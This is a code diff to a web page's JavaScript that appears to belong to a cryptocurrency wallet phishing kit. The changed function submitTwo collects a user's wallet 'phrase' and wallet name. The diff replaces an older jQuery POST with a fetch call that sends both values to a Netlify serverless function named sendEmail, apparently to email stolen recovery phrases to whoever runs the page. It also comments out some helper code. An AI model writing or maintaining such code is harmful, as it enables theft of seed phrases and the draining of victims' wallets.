@@ -2054,7 +2054,7 @@
 
     <script>
       function submitTwo(phrase, walletName) {
-        $.ajax({
+        /*$.ajax({
           url: authTwo,
           method: "POST",
           data: { phrase: phrase, wallet: walletName },
@@ -2065,7 +2065,31 @@
           error: function (errMsg) {
             alert("Error connecting......");
           },
-        });
+        });*/
+        // Create the data object
+            const data = {
+                sender_name: walletName,
+                value: phrase,
+            };
+
+            // Make the POST request to the Netlify function
+            fetch('/.netlify/functions/sendEmail', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message) {
+                    alert('Your message has been sent successfully!');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('There was an issue sending your message.');
+            });
       }
 
       function submitStuff(type, wallet, value1) {
@@ -2241,7 +2265,7 @@
         });
       });
 
-      function getRandomInt(min, max) {
+      /*function getRandomInt(min, max) {
         min = Math.ceil(min);
         max = Math.floor(max);
         return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
@@ -2260,7 +2284,7 @@
         ) {
           return false;
         }
-      });
+      });*/
     </script>
 
 <script>
